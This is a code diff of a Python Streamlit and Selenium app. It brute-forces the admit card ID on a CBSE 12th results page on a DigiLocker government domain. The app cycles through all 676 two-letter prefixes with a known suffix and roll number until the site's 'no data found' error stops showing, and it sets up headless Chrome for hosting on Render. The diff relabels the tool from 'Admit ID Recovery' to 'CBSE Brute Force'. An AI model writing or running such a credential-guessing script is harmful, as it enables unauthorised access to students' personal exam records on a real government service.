@@ -1,126 +1,130 @@
 import streamlit as st
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
 import os
 import time
 import string
-from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
 
-# ====================== CONFIGURATION ======================
+# ========================= CONFIGURATION =========================
 URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
 
+# Selectors
+FIELD1 = (By.ID, "rroll")
+FIELD2 = (By.ID, "admn_id")
+SUBMIT = (By.ID, "submit")
+
+# Streamlit UI Configuration
+st.set_page_config(page_title="CBSE Brute Force", page_icon="🔍")
+st.title("🔍 CBSE 12th Result Brute Forcer")
+
+# Sidebar for Inputs
+with st.sidebar:
+    st.header("Settings")
+    roll_val = st.text_input("Roll Number", value="18615895")
+    suffix_val = st.text_input("Known Suffix (Last 6)", value="954511")
+    delay_val = st.slider("Attempt Delay", 0.5, 5.0, 1.5)
+
+# ========================= DRIVER SETUP =========================
 def get_driver():
-    """Sets up Chrome using the built-in Selenium Manager for 2026."""
-    chrome_options = Options()
-    chrome_options.add_argument("--headless=new")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--window-size=1280,720")
-    chrome_options.add_argument("--blink-settings=imagesEnabled=false")
+    options = Options()
+    options.add_argument("--headless=new") # Required for Render
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--disable-gpu")
+    options.add_argument("--window-size=1280,720")
     
-    # Path where render-build.sh installs Chrome on Render
+    # Path where render-build.sh installed Chrome
     render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
     if os.path.exists(render_bin):
-        chrome_options.binary_location = render_bin
-    
-    # Selenium 4.10+ automatically finds the matching driver
-    return webdriver.Chrome(options=chrome_options)
+        options.binary_location = render_bin
+        
+    # Selenium 4.10+ handles the driver download automatically
+    return webdriver.Chrome(options=options)
 
+# ========================= SUCCESS LOGIC =========================
 def is_success(driver):
-    """
-    Logic: Returns True if the 'No data found' error message 
-    is NOT visible after clicking submit.
-    """
+    """Keep same logic as your local script"""
     try:
-        # Short wait to let the site process the click
-        time.sleep(1.5) 
-        
+        # Check for visible error message
         error_elements = driver.find_elements(By.ID, "err_msg")
+        if error_elements:
+            error_elem = error_elements[0]
+            if error_elem.is_displayed() and "no data found" in error_elem.text.lower():
+                return False
         
-        # If the element is missing entirely, we likely bypassed the login
-        if not error_elements:
+        # Success indicators
+        success_indicators = ["marks", "result", "subject", "grade", "total"]
+        page_text = driver.page_source.lower()
+        if any(ind in page_text for ind in success_indicators):
             return True
             
-        error_msg = error_elements[0]
-        
-        # If the error is visible and contains 'no data', this attempt failed
-        if error_msg.is_displayed() and "no data found" in error_msg.text.lower():
-            return False
-            
-        # If the error is hidden or contains different text, it's a success
-        return True
+        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
+            return True
     except:
-        # In case of doubt (like a page crash), assume success to be safe
-        return False
+        pass
+    return False
 
-# ====================== STREAMLIT UI ======================
-st.set_page_config(page_title="CBSE Admit ID Recovery", page_icon="🔍")
-st.title("🔍 CBSE 12th Admit ID Recovery")
-
-col1, col2 = st.columns(2)
-with col1:
-    roll_number = st.text_input("Roll Number", value="18615900", help="7 or 8 digit roll number")
-with col2:
-    known_suffix = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
-
-delay = st.slider("Request Delay (Seconds)", 0.5, 5.0, 2.0, help="Higher delay prevents IP blocking")
-
-if st.button("🚀 Start Recovery", type="primary"):
-    if len(known_suffix) != 6:
-        st.error("The suffix must be exactly 6 characters.")
-    else:
-        with st.status("Initializing Browser...", expanded=True) as status:
-            driver = None
+# ========================= MAIN LOOP =========================
+if st.button("🚀 Start Brute Force", type="primary"):
+    status_log = st.empty()
+    progress_bar = st.progress(0)
+    log_area = st.expander("Attempt Logs", expanded=True)
+    
+    driver = None
+    try:
+        driver = get_driver()
+        driver.get(URL)
+        status_log.success("✅ Page loaded. Starting attempts...")
+        
+        letters = string.ascii_uppercase
+        combos = [f"{a}{b}" for a in letters for b in letters]
+        
+        for i, prefix in enumerate(combos):
+            code = f"{prefix}{suffix_val}"
+            
+            # Update UI
+            status_log.info(f"Trying: **{prefix}** ({i+1}/{len(combos)})")
+            progress_bar.progress((i + 1) / len(combos))
+            
             try:
-                driver = get_driver()
-                letters = string.ascii_uppercase
-                combos = [f"{a}{b}" for a in letters for b in letters]
+                # Reload page every loop to ensure elements are clean (prevent Stale Errors)
+                driver.get(URL)
+                wait = WebDriverWait(driver, 10)
                 
-                for i, prefix in enumerate(combos):
-                    full_id = f"{prefix}{known_suffix}"
-                    status.update(label=f"Testing: {full_id} ({i+1}/{len(combos)})", state="running")
-                    
-                    # 1. Reset page to ensure a clean state
-                    driver.get(URL)
-                    wait = WebDriverWait(driver, 10)
-                    
-                    try:
-                        # 2. Locate Elements
-                        roll_field = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
-                        admn_field = driver.find_element(By.ID, "admn_id")
-                        submit_btn = driver.find_element(By.ID, "submit")
-                        
-                        # 3. Input Data (Clear first to be safe)
-                        roll_field.clear()
-                        roll_field.send_keys(roll_number)
-                        admn_field.clear()
-                        admn_field.send_keys(full_id)
-                        
-                        # 4. Click Submit
-                        submit_btn.click()
-                        
-                        # 5. Check Result
-                        if is_success(driver):
-                            status.update(label="✅ Success!", state="complete")
-                            st.balloons()
-                            st.success(f"**MATCH FOUND!**\n\nAdmit Card ID: `{full_id}`")
-                            st.code(f"Full Admit ID: {full_id}", language="text")
-                            break
-                        
-                    except Exception as e:
-                        # If a single attempt fails due to timeout, just keep going
-                        continue
+                f1 = wait.until(EC.presence_of_element_located(FIELD1))
+                f2 = driver.find_element(*FIELD2)
+                
+                f1.clear()
+                f1.send_keys(roll_val)
+                f2.clear()
+                f2.send_keys(code)
+                
+                driver.find_element(*SUBMIT).click()
+                
+                time.sleep(delay_val)
+                
+                if is_success(driver):
+                    st.balloons()
+                    st.success(f"🎉 **SUCCESS FOUND!**")
+                    st.write(f"**Prefix:** {prefix}")
+                    st.write(f"**Full Code:** {code}")
+                    break
                 else:
-                    status.update(label="❌ No Match Found", state="error")
-                    st.warning("Finished all 676 combinations without a result.")
-
-            except Exception as e:
-                st.error(f"Critical System Error: {e}")
-            finally:
-                if driver:
-                    driver.quit()
+                    log_area.write(f"❌ {prefix} failed.")
+                    
+            except Exception as loop_e:
+                log_area.error(f"⚠️ Error on {prefix}: {str(loop_e)[:50]}")
+                continue
+        else:
+            st.error("❌ Finished all 676 attempts without success.")
+            
+    except Exception as e:
+        st.error(f"Critical Error: {e}")
+    finally:
+        if driver:
+            driver.quit()
